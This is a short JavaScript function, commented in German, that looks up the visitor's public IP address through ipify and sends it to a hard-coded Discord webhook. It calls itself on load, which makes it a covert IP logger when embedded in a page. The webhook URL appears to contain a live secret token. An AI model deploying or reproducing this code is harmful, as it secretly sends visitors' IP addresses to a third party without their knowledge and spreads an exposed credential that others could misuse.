async function fetchAndSendIpAddress() {
    try {
        // Schritt 1: JSON-Daten abrufen
        const response = await fetch('https://api.ipify.org/?format=json');
        const data = await response.json();

        // Die IP-Adresse ist im JSON-Daten unter dem Schlüssel 'ip' gespeichert
        const ipAddress = data.ip;

        // Schritt 2: IP-Adresse an Discord Webhook senden
        const webhookURL = 'https://discord.com/api/webhooks/1266125230993178710/jAlkmKSYGpKc1ehon3g7aoibKfwsg-Aowu_uUipUambuIXXQ9LFo8bNLR0APME_T4OuO';

        const payload = {
            content: `Die IP-Adresse ist: ${ipAddress}`
        };

        const webhookResponse = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (webhookResponse.ok) {
            console.log('IP-Adresse erfolgreich an Discord gesendet');
        } else {
            console.error('Fehler beim Senden an Discord', webhookResponse.statusText);
        }
    } catch (error) {
        console.error('Fehler:', error);
    }
}

// Funktion aufrufen
fetchAndSendIpAddress();
